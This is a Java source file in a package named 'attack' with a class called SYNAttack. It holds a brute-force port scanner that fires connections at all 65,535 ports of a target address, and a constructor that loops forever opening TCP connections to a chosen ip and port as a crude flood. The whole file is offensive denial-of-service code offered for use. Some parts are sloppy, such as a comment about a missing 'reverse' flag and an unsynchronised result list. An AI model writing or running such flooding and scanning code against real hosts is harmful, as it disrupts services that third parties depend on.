package attack;

import utils.LoggingUtils;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SYNAttack extends LoggingUtils {

    public static Integer getOpenPort(final String ipv4) {

        // Here reverse tells if we should return open ports (false) or closed ports (true).
        final ExecutorService executorService = Executors.newFixedThreadPool(65535);
        final List<CompletableFuture<Void>> futures = new ArrayList<>();

        // List of open ports we will return at the end
        final List<Integer> returnPorts = new ArrayList<>();

        for (int i = 0; i <= 65535; i++) {

            if (!returnPorts.isEmpty()) {
                return returnPorts.get(0);
            }

            int finalI = i;

            final CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {

                try {
                    new Socket().connect(new InetSocketAddress(ipv4, finalI), 1000);
                    returnPorts.add(finalI);
                } catch (final IOException ignored) {
                }
            }, executorService);
            futures.add(future);
        }
        CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
        executorService.shutdownNow();

        return null;
    }

    public SYNAttack(final String ip, final int port) {

        new Thread(() -> {

            while (true) {

                try {

                    final Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(InetAddress.getByName(ip), port), 2500);
                    Thread.sleep(100);
                    socket.close();

                } catch (final IOException | InterruptedException ignored) {}
            }
        }).start();
    }
}
